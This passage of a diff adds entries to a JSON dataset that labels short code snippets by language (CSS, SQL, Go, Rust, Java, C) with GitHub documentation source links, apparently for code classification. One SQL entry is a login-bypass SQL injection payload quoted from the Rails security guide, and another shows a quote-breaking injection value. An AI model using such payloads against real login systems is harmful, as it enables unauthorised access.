+    "code": "/* app/assets/stylesheets/application.css */\nbody {\n  font-family: Arial, Helvetica, sans-serif;\n  padding: 1rem;\n}\n\nnav {\n  justify-content: flex-end;\n  display: flex;\n  font-size: 0.875em;\n  gap: 0.5rem;\n  max-width: 1024px;\n  margin: 0 auto;\n  padding: 1rem;\n}\n\nnav a {\n  display: inline-block;\n}\n\nmain {\n  max-width: 1024px;\n  margin: 0 auto;\n}\n\n.alert,\n.error {\n  color: red;\n}\n\n.notice {\n  color: green;\n}\n\nsection.product {\n  display: flex;\n  gap: 1rem;\n  flex-direction: row;\n}\n\nsection.product img {\n  border-radius: 8px;\n  flex-basis: 50%;\n  max-width: 50%;\n}",
+    "tag": "css",
+    "source": "https://github.com/rails/rails/blob/a0fd31e1a4e96c80d3184998c956607004fb7f8c/guides/source/getting_started.md#L2616"
+  },
+  {
+    "label": "css",
+    "code": "@import \"native.css\";",
+    "tag": "css",
+    "source": "https://github.com/jekyll/jekyll/blob/97c3bdc822df9d5bea4c269b29a28de5a5e29d70/docs/_docs/liquid/tags.md#L100"
+  },
+  {
+    "label": "css",
+    "code": "background: url(\"/bg/pattern.svg\");",
+    "tag": "css",
+    "source": "https://github.com/rails/rails/blob/a0fd31e1a4e96c80d3184998c956607004fb7f8c/guides/source/asset_pipeline.md#L288"
+  },
+  {
+    "label": "css",
+    "code": ":global {\n    y {\n        color: red;\n    }\n}\n\nx y {\n    color: red;\n}",
+    "tag": "css",
+    "source": "https://github.com/sveltejs/svelte/blob/356c8766a024d5982c276e898903fadaceaca960/packages/svelte/messages/compile-errors/style.md#L33"
+  },
+  {
+    "label": "css",
+    "code": "@import 'tailwindcss';\n\n@source '../../vendor/laravel/framework/src/Illuminate/Pagination/resources/views/*.blade.php';",
+    "tag": "css",
+    "source": "https://github.com/laravel/docs/blob/36fa00db57f97d0a5a89c40be7f50ff8b1133327/pagination.md#L30"
+  },
+  {
+    "label": "css",
+    "code": "section.settings {\n  display: flex;\n  gap: 1rem;\n}\n\nsection.settings nav {\n  width: 200px;\n}\n\nsection.settings nav a {\n  display: block;\n}",
+    "tag": "css",
+    "source": "https://github.com/rails/rails/blob/a0fd31e1a4e96c80d3184998c956607004fb7f8c/guides/source/sign_up_and_settings.md#L629"
+  },
+  {
+    "label": "css",
+    "code": ".container {\n  grid-template-columns: [first] 40px [line2] 50px [line3] auto [col4-start] 50px [five] 40px [end];\n  grid-template-rows: [row1-start] 25% [row1-end] 100px [third-line] auto [last-line];\n}",
+    "tag": "css",
+    "source": "https://github.com/sass/sass-site/blob/5701c5d1b2290358487b4f51b6ca20ee04fb8784/source/blog/008-sass-35-release-candidate.md#L106"
+  },
+  {
+    "label": "css",
+    "code": "h1 {\n  font-size: 2em;\n}\n\nh2 {\n  font-size: 1.5em;\n}\n\nh3 {\n  font-size: 1.2em;\n}",
+    "tag": "css",
+    "source": "https://github.com/sass/sass-site/blob/5701c5d1b2290358487b4f51b6ca20ee04fb8784/source/blog/003-sass-33-is-released.md#L74"
+  },
+  {
+    "label": "css",
+    "code": "/* This only changes this particular animation duration */\n.animate__animated.animate__bounce {\n  --animate-duration: 2s;\n}\n\n/* This changes all the animations globally */\n:root {\n  --animate-duration: 800ms;\n  --animate-delay: 0.9s;\n}",
+    "tag": "css",
+    "source": "https://github.com/animate-css/animate.css/blob/3f8ab233dbbd9d2fe577528d2296382954be3d1a/docsSource/sections/01-usage.md#L70"
+  },
+  {
+    "label": "sql",
+    "code": "CREATE TABLE  smdb.service(\n\t\"service_id\" INTEGER NOT NULL PRIMARY KEY,\n\t\"name\" Text NOT NULL,\n\t\"version\" INTEGER NOT NULL,\n\t\"online\" BOOLEAN NOT NULL,\n\t\"description\" Text NOT NULL,\n\t\"health_check_uri\" Text NOT NULL,\n\t\"base_uri\" Text NOT NULL,\n\t\"dependencies\" INTEGER[] NOT NULL,\n\t\"endpoints\" smdb.service_endpoint[] NOT NULL\n);",
+    "tag": "sql",
+    "source": "https://github.com/diesel-rs/diesel/blob/3234c902355149cb8f6ea7c0bd8857d8a5c90f27/examples/postgres/custom_arrays/README.md#L219"
+  },
+  {
+    "label": "sql",
+    "code": "create index concurrently idx_book_isbns on books(isbn);",
+    "tag": "sql",
+    "source": "https://github.com/jbranchaud/til/blob/ae83a39fa8cf4230f23b81e49667e8d6745c7429/postgres/create-an-index-without-locking-the-table.md#L9"
+  },
+  {
+    "label": "sql",
+    "code": "EXPLAIN SELECT `customers`.* FROM `customers`  WHERE `customers`.`id` = 1\n+----+-------------+-----------+-------+---------------+\n| id | select_type | table     | type  | possible_keys |\n+----+-------------+-----------+-------+---------------+\n|  1 | SIMPLE      | customers | const | PRIMARY       |\n+----+-------------+-----------+-------+---------------+\n+---------+---------+-------+------+-------+\n| key     | key_len | ref   | rows | Extra |\n+---------+---------+-------+------+-------+\n| PRIMARY | 4       | const |    1 |       |\n+---------+---------+-------+------+-------+\n\n1 row in set (0.00 sec)\n\nEXPLAIN SELECT `orders`.* FROM `orders`  WHERE `orders`.`customer_id` IN (1)\n+----+-------------+--------+------+---------------+\n| id | select_type | table  | type | possible_keys |\n+----+-------------+--------+------+---------------+\n|  1 | SIMPLE      | orders | ALL  | NULL          |\n+----+-------------+--------+------+---------------+\n+------+---------+------+------+-------------+\n| key  | key_len | ref  | rows | Extra       |\n+------+---------+------+------+-------------+\n| NULL | NULL    | NULL |    1 | Using where |\n+------+---------+------+------+-------------+\n\n\n1 row in set (0.00 sec)",
+    "tag": "sql",
+    "source": "https://github.com/rails/rails/blob/a0fd31e1a4e96c80d3184998c956607004fb7f8c/guides/source/active_record_querying.md#L3487"
+  },
+  {
+    "label": "sql",
+    "code": "select * from `users` where `created_at` < 0021-02-18 00:00:00",
+    "tag": "sql",
+    "source": "https://github.com/laravel/docs/blob/36fa00db57f97d0a5a89c40be7f50ff8b1133327/eloquent.md#L1529"
+  },
+  {
+    "label": "sql",
+    "code": "SELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '2'>'1' LIMIT 1",
+    "tag": "sql",
+    "source": "https://github.com/rails/rails/blob/a0fd31e1a4e96c80d3184998c956607004fb7f8c/guides/source/security.md#L932"
+  },
+  {
+    "label": "sql",
+    "code": "UPDATE developers SET name = 'Bob' WHERE id = 1",
+    "tag": "sql",
+    "source": "https://github.com/rails/rails/blob/a0fd31e1a4e96c80d3184998c956607004fb7f8c/guides/source/active_record_composite_primary_keys.md#L81"
+  },
+  {
+    "label": "sql",
+    "code": "CREATE DATABASE composite_type_db ENCODING 'UTF8'  LC_COLLATE='C'  LC_CTYPE='C'  template=template0 OWNER postgres;",
+    "tag": "sql",
+    "source": "https://github.com/diesel-rs/diesel/blob/3234c902355149cb8f6ea7c0bd8857d8a5c90f27/examples/postgres/composite_types/README.md#L171"
+  },
+  {
+    "label": "sql",
+    "code": "SELECT *\nFROM albums\nWHERE published = true AND NOT (\n    title LIKE '%explicit%' OR\n    lyrics LIKE '%explicit%' OR\n    tags LIKE '%explicit%'\n)",
+    "tag": "sql",
+    "source": "https://github.com/laravel/docs/blob/36fa00db57f97d0a5a89c40be7f50ff8b1133327/queries.md#L681"
+  },
+  {
+    "label": "sql",
+    "code": "INSERT INTO users (name, hair_color) VALUES\n  ('Sean', 'Black'),\n  ('Gordon', DEFAULT)\n  RETURNING *",
+    "tag": "sql",
+    "source": "https://github.com/diesel-rs/diesel/blob/3234c902355149cb8f6ea7c0bd8857d8a5c90f27/README.md#L187"
+  },
+  {
+    "label": "sql",
+    "code": "SELECT username, firstname, lastname FROM users WHERE id = 'user input';\n\nSELECT username, firstname, lastname FROM users WHERE id = 'evil'input';",
+    "tag": "sql",
+    "source": "https://github.com/goldbergyoni/nodebestpractices/blob/dc3d60c29d5483d9ea99cf261bbd6203516a2ba7/sections/security/ormodmusage.russian.md#L36"
+  },
+  {
+    "label": "sql",
+    "code": "select *\nfrom posts\nwhere user_id = ? and (active = 1 or votes >= 100)",
+    "tag": "sql",
+    "source": "https://github.com/laravel/docs/blob/36fa00db57f97d0a5a89c40be7f50ff8b1133327/eloquent-relationships.md#L1624"
+  },
+  {
+    "label": "sql",
+    "code": "show slave status",
+    "tag": "sql",
+    "source": "https://github.com/doocs/advanced-java/blob/80b89fb9496d7ea3213e402c8c3853399e00c363/docs/high-concurrency/mysql-read-write-separation.md#L41"
+  },
+  {
+    "label": "go",
+    "code": "(dlv) config max-string-len 90\n(dlv) print diagnostics.Solutions[0]\n\"295743861\\n431865972\\n876192543\\n387459216\\n612387495\\n549216738\\n763524189\\n928671354\\n154938627\"",
+    "tag": "go",
+    "source": "https://github.com/jbranchaud/til/blob/ae83a39fa8cf4230f23b81e49667e8d6745c7429/go/configure-max-string-print-length-for-delve.md#L21"
+  },
+  {
+    "label": "go",
+    "code": "import (\n\t\"cmp\"\n\t\"fmt\"\n\t\"slices\"\n)\n\ntype Direction int\n\nconst (\n\tASC Direction = iota\n\tDESC\n)\n\nfunc SortItems[T cmp.Ordered](items []T, dir Direction) {\n\tslices.SortFunc(items, func(i, j T) int {\n\t\tif dir == ASC {\n\t\t\treturn cmp.Compare(i, j)\n\t\t} else if dir == DESC {\n\t\t\treturn cmp.Compare(j, i)\n\t\t} else {\n\t\t\tpanic(fmt.Sprintf(\"Unrecognized sort direction: %d\", dir))\n\t\t}\n\t})\n}\n\n// items := []int{3,2,8,1}\n// SortItems(items, ASC)\n// // items => [1,2,3,8]\n// SortItems(items, DESC)\n// // items => [8,3,2,1]",
+    "tag": "go",
+    "source": "https://github.com/jbranchaud/til/blob/ae83a39fa8cf4230f23b81e49667e8d6745c7429/go/sort-slice-in-ascending-or-descending-order.md#L15"
+  },
+  {
+    "label": "go",
+    "code": "// Basic imports\nimport (\n\t\"testing\"\n\n\t\"github.com/stretchr/testify/suite\"\n)\n\n// Define the suite, and absorb the built-in basic suite\n// functionality from testify - including assertion methods.\ntype ExampleTestSuite struct {\n\tsuite.Suite\n\tVariableThatShouldStartAtFive int\n}\n\n// Make sure that VariableThatShouldStartAtFive is set to five\n// before each test\nfunc (suite *ExampleTestSuite) SetupTest() {\n\tsuite.VariableThatShouldStartAtFive = 5\n}\n\n// All methods that begin with \"Test\" are run as tests within a\n// suite.\nfunc (suite *ExampleTestSuite) TestExample() {\n\tsuite.Equal(suite.VariableThatShouldStartAtFive, 5)\n}\n\n// In order for 'go test' to run this suite, we need to create\n// a normal test function and pass our suite to suite.Run\nfunc TestExampleTestSuite(t *testing.T) {\n\tsuite.Run(t, new(ExampleTestSuite))\n}",
+    "tag": "go",
+    "source": "https://github.com/stretchr/testify/blob/87a7b9d57689f6579db2da795ab8deeab29cb724/README.md#L267"
+  },
+  {
+    "label": "go",
+    "code": "rootCmd.PersistentFlags().BoolVarP(&Verbose, \"verbose\", \"v\", false, \"verbose output\")",
+    "tag": "go",
+    "source": "https://github.com/spf13/cobra/blob/adbc8813901bba65827259daa8e22ff94ec1f30e/site/content/user_guide.md#L272"
+  },
+  {
+    "label": "go",
+    "code": "import \"github.com/gin-gonic/gin\"",
+    "tag": "go",
+    "source": "https://github.com/gin-gonic/gin/blob/0f09c3a9b4626d9fe9979cf4d0521d6ae32ab646/README.md#L54"
+  },
+  {
+    "label": "go",
+    "code": "cmd.RegisterFlagCompletionFunc(\"flag-name\", cobra.NoFileCompletions)",
+    "tag": "go",
+    "source": "https://github.com/spf13/cobra/blob/adbc8813901bba65827259daa8e22ff94ec1f30e/site/content/completions/_index.md#L317"
+  },
+  {
+    "label": "go",
+    "code": "// lumberjack.Logger is already safe for concurrent use, so we don't need to\n// lock it.\nw := zapcore.AddSync(&lumberjack.Logger{\n  Filename:   \"/var/log/myapp/foo.log\",\n  MaxSize:    500, // megabytes\n  MaxBackups: 3,\n  MaxAge:     28, // days\n})\ncore := zapcore.NewCore(\n  zapcore.NewJSONEncoder(zap.NewProductionEncoderConfig()),\n  w,\n  zap.InfoLevel,\n)\nlogger := zap.New(core)",
+    "tag": "go",
+    "source": "https://github.com/uber-go/zap/blob/4892335e05f14bce8a98a69a577fcf3844a42623/FAQ.md#L128"
+  },
+  {
+    "label": "go",
+    "code": "package main\n\nimport (\n\t\"net/http\"\n\n\t\"github.com/go-chi/chi/v5\"\n\t\"github.com/go-chi/chi/v5/middleware\"\n)\n\nfunc main() {\n\tr := chi.NewRouter()\n\tr.Use(middleware.Logger)\n\tr.Get(\"/\", func(w http.ResponseWriter, r *http.Request) {\n\t\tw.Write([]byte(\"welcome\"))\n\t})\n\thttp.ListenAndServe(\":3000\", r)\n}",
+    "tag": "go",
+    "source": "https://github.com/go-chi/chi/blob/9f8adb1aabaa8a91180a821111d3f8e668d1c0bf/README.md#L48"
+  },
+  {
+    "label": "go",
+    "code": "logger, _ := zap.NewProduction()\ndefer logger.Sync()\nlogger.Info(\"failed to fetch URL\",\n  // Structured context as strongly typed Field values.\n  zap.String(\"url\", url),\n  zap.Int(\"attempt\", 3),\n  zap.Duration(\"backoff\", time.Second),\n)",
+    "tag": "go",
+    "source": "https://github.com/uber-go/zap/blob/4892335e05f14bce8a98a69a577fcf3844a42623/README.md#L43"
+  },
+  {
+    "label": "go",
+    "code": "m := GetProto()\nif m.Foo != nil {\n  // Clear the field:\n  m.Foo = nil\n} else {\n  // Field is not present, so set it.\n  m.Foo = proto.Int32(1)\n}",
+    "tag": "go",
+    "source": "https://github.com/protocolbuffers/protobuf/blob/5db636d202550a7c6efa49f5ea9742f87e32bab0/docs/field_presence.md#L443"
+  },
+  {
+    "label": "go",
+    "code": "package main\n\nimport (\n\t\"github.com/gin-gonic/gin\"\n\t\"github.com/gin-gonic/gin/ginS\"\n)\n\nfunc main() {\n\tginS.GET(\"/\", func(c *gin.Context) { c.String(200, \"Hello World\") })\n\tginS.Run()\n}",
+    "tag": "go",
+    "source": "https://github.com/gin-gonic/gin/blob/0f09c3a9b4626d9fe9979cf4d0521d6ae32ab646/ginS/README.md#L5"
+  },
+  {
+    "label": "rust",
+    "code": "use axum::{routing::get, Router};\nuse tower::limit::ConcurrencyLimitLayer;\n\nasync fn handler() {}\n\nlet app = Router::new().route(\n    \"/\",\n    // All requests to `GET /` will be sent through `ConcurrencyLimitLayer`\n    get(handler).layer(ConcurrencyLimitLayer::new(64)),\n);\n# let _: Router = app;",
+    "tag": "rust",
+    "source": "https://github.com/tokio-rs/axum/blob/86aa6153e47b7862737acdcfe3a0eb3a162b939a/axum/src/docs/method_routing/layer.md#L15"
+  },
+  {
+    "label": "rust",
+    "code": "use diesel_derive_enum::DbEnum;\n\n#[derive(Debug, PartialEq, DbEnum)]\npub enum Language {\n    En,\n    Ru,\n    De,\n}",
+    "tag": "rust",
+    "source": "https://github.com/diesel-rs/diesel/blob/3234c902355149cb8f6ea7c0bd8857d8a5c90f27/guide_drafts/custom_types.md#L144"
+  },
+  {
+    "label": "rust",
+    "code": "fn app() -> clap::App<'static> {\n    ...\n}\n\n#[test]\nfn verify_app() {\n    app().debug_assert();\n}",
+    "tag": "rust",
+    "source": "https://github.com/clap-rs/clap/blob/ccc89b83875474399e9d9d70841163f6319d1a41/CHANGELOG.md#L2022"
+  },
+  {
+    "label": "rust",
+    "code": "use ignore::WalkBuilder;\n\nfor result in WalkBuilder::new(\"./\").hidden(false).build() {\n    println!(\"{:?}\", result);\n}",
+    "tag": "rust",
+    "source": "https://github.com/BurntSushi/ripgrep/blob/6892bc2b7efe5909cbbeec8f757ed2c4c76b1d30/crates/ignore/README.md#L51"
+  },
+  {
+    "label": "rust",
+    "code": "// File: src/models.rs\n\n// Add serde, serde_derive, and serde_json to simulate\n// deserializing a web form.\nextern crate serde;\nextern crate serde_derive;\nextern crate serde_json;\n\n\nuse schema::users;\n\n#[derive(Queryable)]\npub struct User {\n    pub id: i32,\n    pub first_name: String,\n    pub last_name: String,\n    pub email: String,\n}\n\n#[derive(Deserialize, Insertable)]\n#[diesel(table_name = users)]\npub struct NewUser<'a> {\n    pub first_name: &'a str,\n    pub last_name: &'a str,\n    #[diesel(column_name = email)]\n    pub electronic_mail: &'a str,\n }",
+    "tag": "rust",
+    "source": "https://github.com/diesel-rs/diesel/blob/3234c902355149cb8f6ea7c0bd8857d8a5c90f27/guide_drafts/trait_derives.md#L378"
+  },
+  {
+    "label": "rust",
+    "code": "pub struct User {\n    pub id: i32,\n    pub name: String,\n    pub hair_color: Option<String>,\n}\n\npub struct Post {\n    pub id: i32,\n    pub user_id: i32,\n    pub title: String,\n    pub body: Option<String>,\n}\n\npub struct Comment {\n    id: i32,\n    post_id: i32,\n    text: String,\n}",
+    "tag": "rust",
+    "source": "https://github.com/diesel-rs/diesel/blob/3234c902355149cb8f6ea7c0bd8857d8a5c90f27/diesel_bench/Readme.md#L77"
+  },
+  {
+    "label": "rust",
+    "code": "// Old\nlet mut builder = ClientBuilder::new();\nif some_val {\n    builder.gzip(false);\n}\nlet client = builder.build()?;\n\n// New\nlet mut builder = ClientBuilder::new();\nif some_val {\n    builder = builder.gzip(false);\n}\nlet client = builder.build()?;",
+    "tag": "rust",
+    "source": "https://github.com/seanmonstar/reqwest/blob/8e1c8061e5dd936762dcef08a64ef2cff584b295/CHANGELOG.md#L741"
+  },
+  {
+    "label": "rust",
+    "code": "let x = thing       // ← chain opens here\n    .foo()          // each link aligned one level in,\n    .bar()          // not progressively deeper\n    .baz();",
+    "tag": "rust",
+    "source": "https://github.com/helix-editor/helix/blob/ba40e547426b0f9896c8bdc699a4ab11f2b37dbc/book/src/guides/indent.md#L157"
+  },
+  {
+    "label": "rust",
+    "code": "#[test]\nfn test_add() {\n    let context = TestContext::new(\"3.12\");\n    uv_snapshot!(context.filters(), context.add().arg(\"requests\"), @\"\");\n}",
+    "tag": "rust",
+    "source": "https://github.com/astral-sh/uv/blob/1cd8cf12bd622f2815406f29e3168d7f052bf1b3/CONTRIBUTING.md#L111"
+  },
+  {
+    "label": "rust",
+    "code": "use pyo3::prelude::*;\n\n#[pymodule]\nmod _core {\n    use pyo3::prelude::*;\n\n    #[pyfunction]\n    fn hello_from_bin() -> String {\n        \"Hello from example-ext!\".to_string()\n    }\n}",
+    "tag": "rust",
+    "source": "https://github.com/astral-sh/uv/blob/1cd8cf12bd622f2815406f29e3168d7f052bf1b3/docs/concepts/projects/init.md#L221"
+  },
+  {
+    "label": "rust",
+    "code": "fn main() -> std::io::Result<()> {\n    let out_dir = std::path::PathBuf::from(std::env::var_os(\"OUT_DIR\").ok_or(std::io::ErrorKind::NotFound)?);\n\n    let cmd = clap::Command::new(\"mybin\")\n        .arg(clap::arg!(-n --name <NAME>))\n        .arg(clap::arg!(-c --count <NUM>));\n\n    let man = clap_mangen::Man::new(cmd);\n    let mut buffer: Vec<u8> = Default::default();\n    man.render(&mut buffer)?;\n\n    std::fs::write(out_dir.join(\"mybin.1\"), buffer)?;\n\n    Ok(())\n}",
+    "tag": "rust",
+    "source": "https://github.com/clap-rs/clap/blob/ccc89b83875474399e9d9d70841163f6319d1a41/clap_mangen/README.md#L34"
+  },
+  {
+    "label": "rust",
+    "code": "use std::collections::HashMap;\n\n#[tokio::main]\nasync fn main() -> Result<(), Box<dyn std::error::Error>> {\n    let resp = reqwest::get(\"https://httpbin.org/ip\")\n        .await?\n        .json::<HashMap<String, String>>()\n        .await?;\n    println!(\"{resp:#?}\");\n    Ok(())\n}",
+    "tag": "rust",
+    "source": "https://github.com/seanmonstar/reqwest/blob/8e1c8061e5dd936762dcef08a64ef2cff584b295/README.md#L32"
+  },
+  {
+    "label": "java",
+    "code": "import java.util.concurrent.atomic.AtomicInteger;\n\npublic class Counter {\n    /**\n     * 最大访问数量\n     */\n    private final int limit = 10;\n    /**\n     * 访问时间差\n     */\n    private final long timeout = 1000;\n    /**\n     * 请求时间\n     */\n    private long time;\n    /**\n     * 当前计数器\n     */\n    private AtomicInteger reqCount = new AtomicInteger(0);\n\n    public boolean limit() {\n        long now = System.currentTimeMillis();\n        if (now < time + timeout) {\n            // 单位时间内\n            reqCount.addAndGet(1);\n            return reqCount.get() <= limit;\n        } else {\n            // 超出单位时间\n            time = now;\n            reqCount = new AtomicInteger(0);\n            return true;\n        }\n    }\n}",
+    "tag": "java",
+    "source": "https://github.com/doocs/advanced-java/blob/80b89fb9496d7ea3213e402c8c3853399e00c363/docs/high-concurrency/how-to-limit-current.md#L15"
+  },
+  {
+    "label": "java",
+    "code": "public void set(key, value) {\n    putToDb(key, value);\n    deleteFromRedis(key);\n\n    // ... a few seconds later\n    deleteFromRedis(key);\n}",
+    "tag": "java",
+    "source": "https://github.com/doocs/advanced-java/blob/80b89fb9496d7ea3213e402c8c3853399e00c363/docs/high-concurrency/redis-consistence.md#L46"
+  },
+  {
+    "label": "java",
+    "code": "UUID.randomUUID().toString().replace(\"-\", \"\") -> sfsdf23423rr234sfdaf",
+    "tag": "java",
+    "source": "https://github.com/doocs/advanced-java/blob/80b89fb9496d7ea3213e402c8c3853399e00c363/docs/high-concurrency/database-shard-global-id-generate.md#L39"
+  },
+  {
+    "label": "java",
+    "code": "@FormUrlEncoded\n@POST(\"user/edit\")\nCall<User> updateUser(@Field(\"first_name\") String first, @Field(\"last_name\") String last);",
+    "tag": "java",
+    "source": "https://github.com/square/retrofit/blob/c7ef8b7212350994aef532c9a6182c59e93be5f4/website/src/content/docs/declarations.md#L60"
+  },
+  {
+    "label": "java",
+    "code": "map.getOrDefault(42, \"not found\");  // not found",
+    "tag": "java",
+    "source": "https://github.com/winterbe/java8-tutorial/blob/9b79999be76274f0c11a5b1d4a4fff4e785dc774/README.md#L589"
+  },
+  {
+    "label": "java",
+    "code": "OkHttpClient client = new OkHttpClient.Builder()\n    .addNetworkInterceptor(new LoggingInterceptor())\n    .build();\n\nRequest request = new Request.Builder()\n    .url(\"http://www.publicobject.com/helloworld.txt\")\n    .header(\"User-Agent\", \"OkHttp Example\")\n    .build();\n\nResponse response = client.newCall(request).execute();\nresponse.body().close();",
+    "tag": "java",
+    "source": "https://github.com/square/okhttp/blob/c3179301fc7d0266c5bf154870c2b0b9da01e7e7/docs/features/interceptors.md#L71"
+  },
+  {
+    "label": "java",
+    "code": "Request washingtonPostRequest = new Request.Builder()\n    .url(\"https://www.washingtonpost.com/\")\n    .build();\nclient.newCall(washingtonPostRequest).enqueue(new Callback() {\n  ...\n});\n\nRequest newYorkTimesRequest = new Request.Builder()\n    .url(\"https://www.nytimes.com/\")\n    .build();\nclient.newCall(newYorkTimesRequest).enqueue(new Callback() {\n  ...\n});",
+    "tag": "java",
+    "source": "https://github.com/square/okhttp/blob/c3179301fc7d0266c5bf154870c2b0b9da01e7e7/docs/features/events.md#L150"
+  },
+  {
+    "label": "java",
+    "code": "interface MyService {\n  @GET(\"/user\")\n  Future<User> getUser();\n}",
+    "tag": "java",
+    "source": "https://github.com/square/retrofit/blob/c7ef8b7212350994aef532c9a6182c59e93be5f4/retrofit-adapters/scala/README.md#L19"
+  },
+  {
+    "label": "java",
+    "code": "final Dispatcher dispatcher = new Dispatcher() {\n\n    @Override\n    public MockResponse dispatch (RecordedRequest request) throws InterruptedException {\n\n        switch (request.getUrl().encodedPath()) {\n          case \"/v1/login/auth/\":\n              return new MockResponse.Builder()\n                  .code(200)\n                  .build();\n          case \"/v1/check/version/\":\n              return new MockResponse.Builder()\n                  .code(200)\n                  .body(\"version=9\")\n                  .build();\n          case \"/v1/profile/info\":\n            return new MockResponse.Builder()\n                .code(200)\n                .body(\"{\\\\\\\"info\\\\\\\":{\\\\\\\"name\\\":\\\"Lucas Albuquerque\\\",\\\"age\\\":\\\"21\\\",\\\"gender\\\":\\\"male\\\"}}\")\n                .build();\n        }\n        return new MockResponse.Builder()\n            .code(404)\n            .build();\n    }\n};\nserver.setDispatcher(dispatcher);",
+    "tag": "java",
+    "source": "https://github.com/square/okhttp/blob/c3179301fc7d0266c5bf154870c2b0b9da01e7e7/mockwebserver/README.md#L206"
+  },
+  {
+    "label": "java",
+    "code": "interface MyService {\n  @GET(\"/user\")\n  ListenableFuture<User> getUser();\n}",
+    "tag": "java",
+    "source": "https://github.com/square/retrofit/blob/c7ef8b7212350994aef532c9a6182c59e93be5f4/retrofit-adapters/guava/README.md#L19"
+  },
+  {
+    "label": "java",
+    "code": "Msg.Builder m = GetProto().toBuilder();\nif (m.hasFoo()) {\n  // Clear the field:\n  m.clearFoo()\n} else {\n  // Field is not present, so set it.\n  m.setFoo(1);\n}",
+    "tag": "java",
+    "source": "https://github.com/protocolbuffers/protobuf/blob/5db636d202550a7c6efa49f5ea9742f87e32bab0/docs/field_presence.md#L474"
+  },
+  {
+    "label": "java",
+    "code": "// Example of a maximally-optimized generated accessor.\nclass FooMessage {\n    public long getBarField() {\n        // Using Unsafe should give us performance that is comparable to a\n        // native member access.\n        //\n        // The constant \"24\" is obtained from upb at compile time.\n        sun.misc.Unsafe.getLong(this.ptr, 24);\n    }\n}",
+    "tag": "java",
+    "source": "https://github.com/protocolbuffers/protobuf/blob/5db636d202550a7c6efa49f5ea9742f87e32bab0/docs/upb/wrapping-upb.md#L200"
+  },
+  {
+    "label": "c",
+    "code": "class FakeClient {\n public:\n  explicit FakeClient(EchoTestService::StubInterface* stub) : stub_(stub) {}\n\n  void DoEcho() {\n    ClientContext context;\n    EchoRequest request;\n    EchoResponse response;\n    request.set_message(\"hello world\");\n    Status s = stub_->Echo(&context, request, &response);\n    EXPECT_EQ(request.message(), response.message());\n    EXPECT_TRUE(s.ok());\n  }\n\n  void DoBidiStream() {\n    EchoRequest request;\n    EchoResponse response;\n    ClientContext context;\n    std::string msg(\"hello\");\n\n    std::unique_ptr<ClientReaderWriterInterface<EchoRequest, EchoResponse>>\n        stream = stub_->BidiStream(&context);\n\n    request.set_message(msg  \"0\");\n    EXPECT_TRUE(stream->Write(request));\n    EXPECT_TRUE(stream->Read(&response));\n    EXPECT_EQ(response.message(), request.message());\n\n    request.set_message(msg  \"1\");\n    EXPECT_TRUE(stream->Write(request));\n    EXPECT_TRUE(stream->Read(&response));\n    EXPECT_EQ(response.message(), request.message());\n\n    request.set_message(msg  \"2\");\n    EXPECT_TRUE(stream->Write(request));\n    EXPECT_TRUE(stream->Read(&response));\n    EXPECT_EQ(response.message(), request.message());\n\n    stream->WritesDone();\n    EXPECT_FALSE(stream->Read(&response));\n\n    Status s = stream->Finish();\n    EXPECT_TRUE(s.ok());\n  }\n\n  void ResetStub(EchoTestService::StubInterface* stub) { stub_ = stub; }\n\n private:\n  EchoTestService::StubInterface* stub_;\n};",
+    "tag": "c",
+    "source": "https://github.com/grpc/grpc/blob/aa725a5afd3cea8ec29a86ec7611660943d01d2a/doc/unit_testing.md#L86"
+  },
+  {
+    "label": "c",
+    "code": "redisReply *reply;\nredisAppendCommand(context,\"SET foo bar\");\nredisAppendCommand(context,\"GET foo\");\nredisGetReply(context,(void**)&reply); // reply for SET\nfreeReplyObject(reply);\nredisGetReply(context,(void**)&reply); // reply for GET\nfreeReplyObject(reply);",
+    "tag": "c",
+    "source": "https://github.com/redis/redis/blob/81d653f5dc8d472a0d4f7dd328be720021580731/deps/hiredis/README.md#L341"
+  },
+  {
+    "label": "c",
+    "code": "#ifndef INCLUDE_git_${filename}_h__\n#define INCLUDE_git_${filename}_h__\n\n#include \"git/common.h\"\n\n/**\n * @file git/${filename}.h\n * @brief Git some description\n * @defgroup git_${filename} some description routines\n * @ingroup Git\n * @{\n */\nGIT_BEGIN_DECL\n\n/* ... definitions ... */\n\n/** @} */\nGIT_END_DECL\n#endif",
+    "tag": "c",
+    "source": "https://github.com/libgit2/libgit2/blob/42a89d7cc9374a19e72fa57011e5fe3a99c7b3bf/docs/conventions.md#L218"
+  },
+  {
+    "label": "c",
+    "code": "    roaring_bitmap_set_copy_on_write(r1, true);\n    roaring_bitmap_set_copy_on_write(r2, true);\n    roaring_bitmap_set_copy_on_write(r3, true);\n\n    roaring_bitmap_t * r1a = roaring_bitmap_copy(r1);\n    roaring_bitmap_t * r1b = roaring_bitmap_copy(r1);\n\n    roaring_bitmap_t * r2a = roaring_bitmap_copy(r2);\n    roaring_bitmap_t * r2b = roaring_bitmap_copy(r2);\n\n    roaring_bitmap_t * r3a = roaring_bitmap_copy(r3);\n    roaring_bitmap_t * r3b = roaring_bitmap_copy(r3);\n\n    roaring_bitmap_t *rarray1[3] = {r1a, r2a, r3a};\n    roaring_bitmap_t *rarray2[3] = {r1b, r2b, r3b};\n    std::thread thread1(run, rarray1);\n    std::thread thread2(run, rarray2);",
+    "tag": "c",
+    "source": "https://github.com/redis/redis/blob/81d653f5dc8d472a0d4f7dd328be720021580731/deps/croaring/README.md#L1196"
+  },
+  {
+    "label": "c",
+    "code": "// upb API to create a message.\nUPB_API upb_Message* upb_Message_New(const upb_MiniTable* mini_table,\n                                     upb_Arena* arena);\n\nvoid MakeMessage(const upb_MiniTable* mini_table) {\n  upb_Arena* arena = upb_Arena_New();\n\n  // This message is allocated on our arena.\n  upb_Message* msg = upb_Message_New(mini_table, arena);\n\n  // We can free the arena whenever we want, but we cannot free the\n  // message separately from the arena.\n  upb_Arena_Free(arena);\n\n  // msg is now deleted.\n}",
+    "tag": "c",
+    "source": "https://github.com/protocolbuffers/protobuf/blob/5db636d202550a7c6efa49f5ea9742f87e32bab0/docs/upb/design.md#L69"
+  },
+  {
+    "label": "c",
+    "code": "int doit(void)\n{\n\tint error;\n\n\tif ((error = dothis()) < 0 ||\n\t    (error = dothat()) < 0)\n\t\treturn error;\n\n\treturn 0;\n}",
+    "tag": "c",
+    "source": "https://github.com/libgit2/libgit2/blob/42a89d7cc9374a19e72fa57011e5fe3a99c7b3bf/docs/coding-style.md#L283"
+  },
+  {
+    "label": "c",
